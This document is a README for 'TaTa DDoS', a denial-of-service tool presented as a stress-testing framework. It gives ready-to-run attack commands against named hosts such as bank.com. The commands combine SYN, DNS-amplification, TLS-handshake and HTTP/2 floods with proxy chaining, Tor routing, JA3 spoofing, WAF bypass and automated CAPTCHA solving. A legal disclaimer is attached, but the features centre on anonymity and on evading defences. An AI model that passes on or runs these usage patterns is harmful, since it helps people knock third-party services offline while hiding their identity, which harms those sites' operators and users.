# 🌀 TaTa DDoS – By netsX

<!-- BANNER IMAGE -->
<p align="center">
  <img src="https://raw.githubusercontent.com/netsXproject/tata-ddos/main/assets/banner.png" alt="TaTa DDoS Banner" width="100%">
</p>

<!-- BADGES -->
<p align="center">
  <a href="https://github.com/netsX-project/tata-ddos/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT">
  </a>
  <a href="https://www.python.org/">
    <img src="https://img.shields.io/badge/python-3.9+-blue.svg" alt="Python 3.9+">
  </a>
  <a href="https://www.rust-lang.org/">
    <img src="https://img.shields.io/badge/rust-1.70+-orange.svg" alt="Rust 1.70+">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/proxy-SOCKS4%2F5%2FHTTP-brightgreen" alt="Proxy Support">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/WAF-bypass-red" alt="WAF Bypass">
  </a>
</p>

> **Enterprise-grade stress-testing framework** – Simulate Black Friday traffic, DDoS attacks, and edge-case failures with full proxy rotation and WAF bypass. Not for script kiddies.

---

## 🚀 Features

- **27+ attack vectors** – HTTP/2, TLS Ghost, DNS reflection, MQTT, CoAP, SIP, and more.
- **Hybrid core** – Rust for speed, Python for orchestration.
- **Full Proxy Support** – SOCKS4, SOCKS5, HTTP/HTTPS with authentication.
- **Intelligent Proxy Rotation** – Random, round-robin, latency-based.
- **Proxy Chaining** – Up to 5 hops for maximum obfuscation.
- **Proxy Harvesting** – Automatic scraping from free proxy lists.
- **Tor Integration** – Route through Tor for anonymity.
- **GeoIP Filtering** – Filter proxies by country (optional).
- **Sticky Sessions** – Persist proxy for entire attack.
- **WAF Bypass** – Browser automation with JA3 fingerprint impersonation.
- **JA3 Spoofing** – Impersonate Chrome, Firefox, Safari, Edge.
- **CAPTCHA Solving** – Integration with 2captcha API.
- **Human-like Behavior** – Mouse movements, scrolling, random clicks.
- **Distributed by design** – Redis + Kubernetes auto-scaling (optional).
- **Stealth king** – Poisson traffic shaping, TLS cipher rotation.
- **Live dashboard** – Real-time PPS, error rate, proxy stats.
- **Post-mortem AI** – Suggests firewall rules and mitigations.

---

## 📦 Installation

```bash
git clone https://github.com/netsX-project/tata-ddos.git
cd tata-ddos
python3 -m venv venv
source venv/bin/activate  # or venv\Scripts\activate on Windows
pip install -r requirements.txt
cargo build --release  # Requires Rust installed
python3 setup.py install
playwright install chromium firefox  # For WAF bypass
```

Quick Test

```bash
python3 tata.py --target 127.0.0.1 --port 8080 --dry-run --duration 10
```

---

🎯 Usage

Basic Attack (No Proxy)

```bash
python3 tata.py --target shop.example.com --port 443 --vectors http2 ghost --workers 500 --duration 120
```

With SOCKS5 Proxies

```bash
python3 tata.py --target api.test.com --proxy-file proxies.txt --proxy-type socks5 --proxy-rotation random --workers 200
```

With HTTP Proxies & Sticky Session

```bash
python3 tata.py --target bank.com --proxy-file http_proxies.txt --proxy-type http --sticky-proxy --duration 60
```

Proxy Chaining (3 hops)

```bash
python3 tata.py --target secure.com --proxy-file premium.txt --proxy-type socks5 --chain-length 3 --proxy-rotation latency-based
```

WAF Bypass – Browser Automation

```bash
# Basic WAF bypass with Chrome
python3 tata.py --target shop.com --waf-bypass --browser-type chrome_120

# Show browser window (debugging)
python3 tata.py --target api.com --waf-bypass --show-browser

# With CAPTCHA solving
python3 tata.py --target bank.com --waf-bypass --captcha-key YOUR_2CAPTCHA_KEY
```

Full Stealth Mode (Proxies + WAF Bypass + JA3 Spoofing)

```bash
python3 tata.py --target secure.com \
    --proxy-file premium.txt \
    --proxy-type socks5 \
    --proxy-rotation random \
    --waf-bypass \
    --browser-type firefox_122 \
    --ja3-spoof \
    --captcha-key YOUR_KEY \
    --duration 300
```

Tor Mode with WAF Bypass

```bash
# Requires Tor running on localhost:9050
python3 tata.py --target darkweb.onion --tor --waf-bypass --browser-type chrome_120
```

---

🌐 Proxy Configuration

Proxy File Format

```
# Simple proxy
192.168.1.100:1080

# Authenticated proxy
203.0.113.5:3128:myuser:mypass

# Mixed types (all supported)
10.0.0.1:9050
198.51.100.7:1080:admin:secret
```

Proxy Types

· SOCKS4 – Legacy, no auth
· SOCKS5 – Recommended, supports auth and UDP
· HTTP/HTTPS – Supports CONNECT method for tunneling

Rotation Strategies

· random – Pick random proxy per connection (default)
· round-robin – Cycle through proxies sequentially
· latency-based – Always use fastest proxy (auto-sorted)

Advanced Features

· Sticky Mode (--sticky-proxy) – Use same proxy for entire session
· Chain Length (--chain-length 1-5) – Route through multiple proxies
· Refresh Interval (--proxy-refresh N) – Auto-refresh proxies every N seconds
· Tor Mode (--tor) – Route through Tor (localhost:9050)

---

🛡️ WAF Bypass Features

TaTa DDoS now includes advanced WAF evasion through browser automation and JA3 fingerprint spoofing.

Browser Automation

· Headless Chrome/Firefox with realistic behavior
· Mouse movements, scrolling, and click simulation
· Random navigation patterns
· JavaScript injection to hide automation markers
· CAPTCHA solving via 2captcha (optional)

JA3 Impersonation

· Spoof TLS fingerprints of popular browsers
· Match exact cipher suites, extensions, and TLS versions
· Random JA3 rotation per request
· HTTP/2 settings matching target browser

Supported Browsers

Browser Version JA3 Signature
Chrome 120 120.0.6099.109 6734f6b3e5b2e0a3...
Firefox 122 122.0.0 7b7a6f5e4d3c2b1a...
Safari 17 17.0 8c8d8e8f90919293...
Edge 120 120.0.2210.61 9a9b9c9d9e9fa0a1...

How WAF Bypass Works

1. Launches headless browser matching target browser
2. Performs realistic navigation (mouse movements, scrolling)
3. Sends HTTP requests with proper headers and timing
4. Rotates JA3 fingerprints every N requests
5. Solves CAPTCHAs automatically (if configured)
6. Detects WAF blocks and adjusts behavior

---

🧠 Attack Vectors Explained

Vector Description WAF Bypass Compatible
http2 HTTP/2 priority frame exhaustion + cache busting ✅ Yes
ghost Incomplete TLS handshakes flood server memory ❌ No (TLS-level)
udp UDP fragment blizzard with random payloads ❌ No
dns DNS water torture + amplification attacks ✅ Yes (via HTTP)
mqtt MQTT publish floods for IoT stress ✅ Yes
coap CoAP confirmable storm for constrained networks ❌ No
sip SIP INVITE spam for VoIP testing ❌ No
tcp SYN flood + RST storm ❌ No
icmp ICMP echo request floods ❌ No

---

📊 Proxy Statistics

During attack, you'll see real-time stats:

```
💥 PPS: 2,345,678 | Errors: 12 | Proxies: 847 | WAF: True
```

Final report includes:

· Total proxies used
· Blacklisted count
· Average latency
· Proxy rotation effectiveness
· WAF bypass usage count

---

🔧 Development

Adding New Vectors

1. Create new method in tata_core.py
2. Add to _execute_attack()
3. Optionally implement in Rust for speed

Custom Proxy Sources

Edit harvest_free_proxies() in tata_proxy.py to add your own scrapers.

WAF Bypass Customization

Modify tata_waf_bypass.py to add new browser behaviors or stealth techniques.

---

⚠️ Legal Disclaimer

This tool is for authorized security testing only. You must own the target or have explicit written consent. Unauthorized use violates laws in most jurisdictions. The author (netsX) assumes no liability for misuse.

DO NOT:

· Use against systems you don't own
· Use for extortion, harassment, or sabotage
· Share proxy lists with malicious intent
· Attempt to bypass WAF on systems you don't own

DO:

· Test your own infrastructure
· Use with red-team contracts
· Report vulnerabilities responsibly
· Document all tests with signed agreements

---

🤝 Contributing

Fork, PR, or open issues – but keep it ethical. We welcome new vectors, proxy integrations, and stealth improvements. All contributions must include clear documentation.

---

📜 License

MIT – do whatever, but don't blame me if you get pwned.

---

🌐 Connect

· GitHub: netsX-project/tata-ddos
· Twitter: @netsX_sec
· Discord: Join our community

---

🙏 Acknowledgments

· Cloudflare for teaching us what not to do
· All the open-source proxy lists we've scraped
· The Rust community for making systems programming fun
· You, for using this responsibly

---

Built with ☕, 🦀, and a touch of chaos.
